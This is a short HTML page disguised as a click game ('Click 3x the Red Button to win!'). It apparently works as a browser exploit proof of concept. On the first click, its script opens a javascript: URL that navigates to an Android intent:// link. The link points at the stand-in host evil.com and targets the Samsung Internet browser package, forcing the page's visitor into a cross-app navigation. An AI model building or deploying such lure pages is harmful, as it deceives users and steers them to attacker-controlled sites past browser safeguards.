<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
    }

    #redBox {
      position: absolute;
      top: 10px;
      right: 50px;
      width: 30px;
      height: 30px;
      background-color: red;
      cursor: pointer;
    }

    #counter, #first {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 40px;
    }
  </style>
  <script>

    var clickCount = 0;

function handleClick() {
  clickCount++;
  document.getElementById("counter").innerHTML = "x" + clickCount;

  if (clickCount == 1) {
    
window.open("javascript:location='intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");

  }
}
  </script>
</head>
<body>
  <div id="game">
    <a id="redBox" href="#" onclick="handleClick()"></a>
    <div id="counter">Click 3x the Red Button to win!</div>
  </div>
</body>
</html>
